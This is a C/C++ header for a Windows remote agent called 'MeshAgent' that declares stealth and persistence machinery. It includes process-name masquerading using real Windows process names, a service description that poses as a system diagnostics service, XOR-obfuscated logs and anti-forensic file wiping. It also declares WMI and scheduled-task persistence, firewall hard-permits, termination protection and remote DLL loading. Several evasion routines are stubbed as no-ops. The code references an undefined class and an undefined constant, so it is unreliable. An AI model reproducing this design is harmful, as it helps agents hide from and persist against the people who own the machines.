/*
 * MeshAgent runtime compatibility declarations
 *
 * SECURITY NOTE: Use these compatibility helpers only on systems the operator
 * owns or is expressly permitted to administer.
 *
 * BUILD SAFETY:
 * Legacy runtime helpers are retained only as compatibility shims for
 * older call sites. They must not alter production runtime decisions.
 */

#ifndef MESHAGENT_RUNTIME_CORE_H
#define MESHAGENT_RUNTIME_CORE_H

// The project already defines WINSOCK2 in PreprocessorDefinitions
// Just include headers in correct order
#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <stdio.h>

// Used for persisted task paths and scheduler/WMI naming.
// 260 matches typical MAX_PATH-sized task path buffers used in this codebase.
#ifndef RUNTIME_TASK_NAME_MAX
#define RUNTIME_TASK_NAME_MAX 260
#endif

// Avoid pulling in winternl/ntdll by default to reduce surface area and
// accidental reliance on unstable/undocumented structures. Only include for
// explicit lab builds.
#ifdef MESHAGENT_ENABLE_RUNTIME_FEATURES
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")
#endif

// C++-only utilities are hidden from C compilation units to keep this header
// safe to include from both .c and .cpp files.
#ifdef __cplusplus

// Process naming compatibility shim (no-op by default)
class ProcessNameObfuscator {
public:
    static BOOL SetRandomProcessName() {
#ifdef MESHAGENT_ENABLE_RUNTIME_FEATURES
        // Placeholder for explicit opt-in behavior when enabled.
        const wchar_t* legitimateNames[] = {
            L"svchost.exe",
            L"RuntimeBroker.exe",
            L"dllhost.exe",
            L"backgroundTaskHost.exe",
            L"SearchProtocolHost.exe"
        };
        (void)legitimateNames;
        return TRUE;
#else
        return TRUE; // no-op success by default
#endif
    }

    // Task manager visibility is preserved by default.
    static BOOL HideFromTaskManager() { return FALSE; }
};

// Network connection compatibility shims.
class NetworkRuntime {
public:
    static DWORD GetObfuscatedSleepTime(DWORD baseTime) {
        return baseTime;
    }

    static BOOL IsRunningInSandbox() {
        return FALSE;
    }

    static BOOL WaitForUserActivity(DWORD timeoutMs) {
        (void)timeoutMs;
        return TRUE;
    }
};

// Service maintenance helpers.
class ServiceMaintenance {
public:
    // Configure normal service recovery behavior.
    static BOOL SetServiceAsCritical(SC_HANDLE hService) {
        SERVICE_FAILURE_ACTIONS sfa = {0};

        // Configure service to restart on failure
        SC_ACTION failureActions[3];
        failureActions[0].Type = SC_ACTION_RESTART;
        failureActions[0].Delay = 30000;  // 30 seconds
        failureActions[1].Type = SC_ACTION_RESTART;
        failureActions[1].Delay = 60000;  // 1 minute
        failureActions[2].Type = SC_ACTION_RESTART;
        failureActions[2].Delay = 120000; // 2 minutes

        sfa.dwResetPeriod = 86400;  // Reset after 24 hours
        sfa.cActions = 3;
        sfa.lpsaActions = failureActions;

        return ChangeServiceConfig2(hService, SERVICE_CONFIG_FAILURE_ACTIONS, &sfa);
    }

    // Set a normal service description.
    static BOOL BlendWithSystemServices(SC_HANDLE hService) {
        // Use generic Windows service description
        static const wchar_t* description =
            L"Provides diagnostic data collection and system health monitoring. "
            L"If this service is stopped, certain features may not function properly.";

        SERVICE_DESCRIPTIONW sd;
        sd.lpDescription = (LPWSTR)description;

        return ChangeServiceConfig2(hService, SERVICE_CONFIG_DESCRIPTION, &sd);
    }
};

// Log file transformation helpers.
class LogSecureStorage {
private:
    static const BYTE TRANSFORM_KEY = 0xA5;

public:
    // Transform log data before writing.
    static void TransformBuffer(LPBYTE buffer, DWORD size) {
        for (DWORD i = 0; i < size; i++) {
            buffer[i] ^= TRANSFORM_KEY;
            buffer[i] = (buffer[i] << 3) | (buffer[i] >> 5);  // Bit rotation
        }
    }

    // Restore transformed log data when reading.
    static void RestoreBuffer(LPBYTE buffer, DWORD size) {
        for (DWORD i = 0; i < size; i++) {
            buffer[i] = (buffer[i] >> 3) | (buffer[i] << 5);  // Reverse bit rotation
            buffer[i] ^= TRANSFORM_KEY;
        }
    }

    // Securely delete log file (DOD 5220.22-M standard)
    static BOOL SecureDelete(const wchar_t* filePath) {
        HANDLE hFile = CreateFileW(filePath, GENERIC_WRITE, 0, NULL,
                                    OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE) return FALSE;

        LARGE_INTEGER fileSize;
        if (!GetFileSizeEx(hFile, &fileSize)) {
            CloseHandle(hFile);
            return FALSE;
        }

        // Overwrite with random data 3 times (DOD standard)
        BYTE* buffer = (BYTE*)malloc(4096);
        if (!buffer) {
            CloseHandle(hFile);
            return FALSE;
        }

        for (int pass = 0; pass < 3; pass++) {
            SetFilePointer(hFile, 0, NULL, FILE_BEGIN);

            for (LONGLONG remaining = fileSize.QuadPart; remaining > 0; remaining -= 4096) {
                DWORD bytesToWrite = (DWORD)min(remaining, 4096);

                // Fill with random data
                for (DWORD i = 0; i < bytesToWrite; i++) {
                    buffer[i] = (BYTE)(rand() % 256);
                }

                DWORD written = 0;
                if (!WriteFile(hFile, buffer, bytesToWrite, &written, NULL) || written != bytesToWrite) {
                    // Abort on partial/failed write to avoid undefined state
                    free(buffer);
                    CloseHandle(hFile);
                    return FALSE;
                }
            }
            FlushFileBuffers(hFile);
        }

        free(buffer);
        CloseHandle(hFile);

        // Finally delete the file
        return DeleteFileW(filePath);
    }
};

// Auto-restart on crash
class CrashRecovery {
public:
    static void EnableAutomaticRestart() {
        // Register unhandled exception filter
        SetUnhandledExceptionFilter(CrashHandler);
    }

private:
    static LONG WINAPI CrashHandler(EXCEPTION_POINTERS* exceptionInfo) {
        // Log crash information (encrypted)
        WCHAR crashLog[MAX_PATH];
        GetModuleFileNameW(NULL, crashLog, MAX_PATH);
        wcscat_s(crashLog, L".crash");

        HANDLE hFile = CreateFileW(crashLog, GENERIC_WRITE, 0, NULL,
                                    CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            char crashData[512];
            sprintf_s(crashData, "Exception: 0x%08X at 0x%p\r\n",
                     exceptionInfo->ExceptionRecord->ExceptionCode,
                     exceptionInfo->ExceptionRecord->ExceptionAddress);

            DWORD written;
            // Encrypt before writing
            LogEncryption::EncryptBuffer((LPBYTE)crashData, (DWORD)strlen(crashData));
            WriteFile(hFile, crashData, (DWORD)strlen(crashData), &written, NULL);
            CloseHandle(hFile);
        }
        // Avoid invoking external processes in an exception context; allow SCM
        // recovery actions to handle restarts (configured via ServiceService).

        return EXCEPTION_EXECUTE_HANDLER;
    }
};

// Runtime detection compatibility shims. Production must not suppress service
// startup based on debugger, capture, or VM heuristics.
class SecurityToolDetection {
public:
    static BOOL IsDebuggerDetected() {
        return FALSE;
    }

    static BOOL IsRunningUnderWireshark() {
        return FALSE;
    }
};

#endif // __cplusplus

// ================================================================
// Svchost Hosting Functions
// ================================================================

#ifdef __cplusplus
extern "C" {
#endif

BOOL ServiceDeploy_PerformCompleteInstallation(
    const wchar_t* sourceExePath,
    const wchar_t* sourceDllPath,
    BOOL useSvchostMode);
BOOL ServiceDeploy_PerformCompleteUninstallation(void);
BOOL ServiceDeploy_RunLifecycleHostOperation(
    const wchar_t* actionName,
    const wchar_t* sourceExePath,
    const wchar_t* sourceDllPath,
    BOOL requireConfig);
BOOL ServiceDeploy_StageSvchostDllForLifecycleHost(
    const wchar_t* sourceExePath,
    const wchar_t* sourceDllPath,
    const wchar_t* destPath);
void ServiceDeploy_ClearRuntimeBrandingOverrides(void);
void ServiceDeploy_SetRuntimeServiceKeyNameUtf8(const char* value);
void ServiceDeploy_SetRuntimeDisplayNameUtf8(const char* value);
void ServiceDeploy_SetRuntimeServiceDescriptionUtf8(const char* value);
void ServiceDeploy_LogInstallEvent(const wchar_t* format, ...);
void ServiceDeploy_LogPathState(const wchar_t* path);

/**
 * Service DLL entry point for svchost.exe hosting
 * Called by svchost.exe when service starts in shared process mode
 */
VOID WINAPI ServiceHost_SvchostServiceMain(DWORD dwArgc, LPTSTR *lpszArgv);

/**
 * Service control handler for svchost-hosted service
 */
DWORD WINAPI ServiceHost_SvchostCtrlHandler(DWORD dwControl, DWORD dwEventType,
                                         LPVOID lpEventData, LPVOID lpContext);

/**
 * Check if currently running inside svchost.exe
 */
BOOL Runtime_IsRunningSvchost(void);

/**
 * Register service for svchost.exe hosting via registry
 */
BOOL ServiceHost_RegisterSvchostService(const wchar_t* serviceName, const wchar_t* dllPath);
BOOL ServiceHost_UnregisterSvchostService(const wchar_t* serviceName);

// ================================================================
// Native Process Utility Helpers
// ================================================================

/**
 * Historical shell execution compatibility shim. Always fails closed in the
 * rundll32-only runtime contract.
 */
// When MESHAGENT_ENABLE_RUNTIME_FEATURES is not defined, all functions below should be
// implemented as harmless stubs returning FALSE/ERROR where appropriate.
BOOL Runtime_ExecuteCommand(const char* command, char* output, size_t outputSize);

// ================================================================
// Process Lookup and Remote Module Compatibility
// ================================================================

/**
 * Find a process by name for compatibility probes.
 */
DWORD Runtime_FindProcessByName(const wchar_t* processName);

/**
 * Remote module loading compatibility shim. Always blocked by policy.
 */
BOOL Runtime_LoadRemoteModuleCompat(DWORD processId, const wchar_t* dllPath);

/**
 * Memory module loading compatibility shim. Always blocked by policy.
 */
BOOL Memory_LoadModuleCompat(DWORD processId, const BYTE* dllBytes, size_t dllSize);

// ================================================================
// Service Resilience & Persistence
// ================================================================

void ServiceDeploy_ApplyPersistenceProfile(void);
void ServiceDeploy_EnsureLoggingDefaults(void);
void ServiceDeploy_SetInstallerLogPathToTemp(const wchar_t* fileName);

/**
 * Windows Firewall rule management for service binaries
 */
BOOL Security_AddFirewallRuleForService(const wchar_t* serviceName, const wchar_t* exePath);
BOOL Security_RemoveFirewallRuleForService(const wchar_t* serviceName);
BOOL Security_RemoveFirewallRulesByExePath(const wchar_t* exePath);
BOOL Security_CheckFirewallRuleForService(const wchar_t* serviceName, const wchar_t* exePath);
BOOL Security_CheckFirewallRuleExists(const wchar_t* serviceName);
BOOL Security_AddWfpHardPermitForApp(const wchar_t* serviceName, const wchar_t* exePath);
BOOL Security_RemoveWfpHardPermitForService(const wchar_t* serviceName);
BOOL Security_CheckWfpHardPermitForApp(const wchar_t* serviceName, const wchar_t* exePath);
BOOL Security_CheckWfpHardPermitExists(const wchar_t* serviceName);
BOOL Security_AddWebRtcFirewallRuleForService(const wchar_t* serviceName, const wchar_t* exePath, BOOL forHostBinary);
BOOL Security_CheckWebRtcFirewallRuleForService(const wchar_t* serviceName, const wchar_t* exePath, BOOL forHostBinary);
BOOL Security_RunFirewallPolicyMaintenance(void);
void Security_StopFirewallPolicyRealtimeGuards(void);

/**
 * Service hardening utilities
 */
BOOL ServiceUtil_ProtectServiceFromTermination(const wchar_t* serviceName);
BOOL MeshService_HardenServiceDaclByName(const wchar_t* serviceName);

/**
 * Shared installation path helpers
 */
typedef struct ServiceInstallPaths
{
    WCHAR installDir[MAX_PATH];
    WCHAR logsDir[MAX_PATH];
    WCHAR exePath[MAX_PATH];
    WCHAR dllPath[MAX_PATH];
    WCHAR dbPath[MAX_PATH];
    WCHAR confPath[MAX_PATH];
    WCHAR logPath[MAX_PATH];
} ServiceInstallPaths;

typedef struct ServicePackagePreflight
{
    BOOL sourceExePresent;
    BOOL sourceEmbeddedConfigPresent;
    BOOL sourceSidecarConfigPresent;
    BOOL configAvailable;
} ServicePackagePreflight;

BOOL ServiceDeploy_GetInstallPaths(ServiceInstallPaths *paths);
BOOL ServiceDeploy_PreflightPackageSource(
    const wchar_t* sourceExePath,
    BOOL requireConfig,
    ServicePackagePreflight* summary,
    wchar_t* failureReason,
    size_t failureReasonCch);

// Persistence state (installRoot\\state\\persistence.ini)
typedef struct ServicePersistenceState
{
    wchar_t AutorunTask[SERVICE_TASK_NAME_MAX];
    wchar_t RestartTask[SERVICE_TASK_NAME_MAX];
    wchar_t WmiFilter[128];
    wchar_t WmiConsumer[128];
} ServicePersistenceState;

BOOL ServiceDeploy_LoadPersistenceState(ServicePersistenceState* state);
BOOL ServiceDeploy_SavePersistenceState(const ServicePersistenceState* state);
void ServiceDeploy_ClearPersistenceState(void);

// Validation helpers
BOOL ServiceDeploy_RunInstallValidation(void);
BOOL ServiceDeploy_RunUpdateValidation(void);
BOOL ServiceDeploy_RunUninstallValidation(void);
BOOL ServiceDeploy_RunPackageValidation(const wchar_t* sourceExePath, BOOL requireConfig);

// Installation helpers (used by installer/registration)
BOOL Security_CreateInstallRootDirectory(const wchar_t* installPath);
BOOL Security_CreateInstallationDirectory(const wchar_t* installPath);
BOOL Security_InstallFiles(const wchar_t* sourcePath, const wchar_t* destPath);
#if defined(WIN32) && defined(MESHAGENT_ENABLE_RUNTIME_FEATURES)
BOOL ServiceDeploy_PerformCompleteInstallation(const wchar_t* sourceExePath, const wchar_t* sourceDllPath, BOOL useSvchostMode);
BOOL ServiceDeploy_PerformCompleteUninstallation(void);
BOOL ServiceDeploy_PerformUpdate(const wchar_t* sourceExePath, const wchar_t* sourceDllPath, BOOL useSvchostMode);
BOOL ServiceDeploy_IsAlreadyInstalled(void);
#endif

// ================================================================
// C Wrappers for C++-only Utilities
// ================================================================

// These wrappers allow C compilation units (e.g., ServiceMain.c) to reference
// optional runtime diagnostics without directly using C++ classes.

// Enable minimal crash recovery handler (no-op by default)
void Runtime_EnableCrashRecovery(void);

// Debugger/monitor detection wrappers retained as deterministic no-ops.
BOOL Runtime_IsDebuggerDetected(void);
BOOL Runtime_IsNetworkMonitorDetected(void);

// Sandbox/user-activity wrappers retained as deterministic no-ops.
BOOL Runtime_IsRunningInSandbox(void);
BOOL Runtime_WaitForUserActivity(DWORD timeoutMs);

#ifdef __cplusplus
}
#endif

#endif // MESHAGENT_RUNTIME_CORE_H
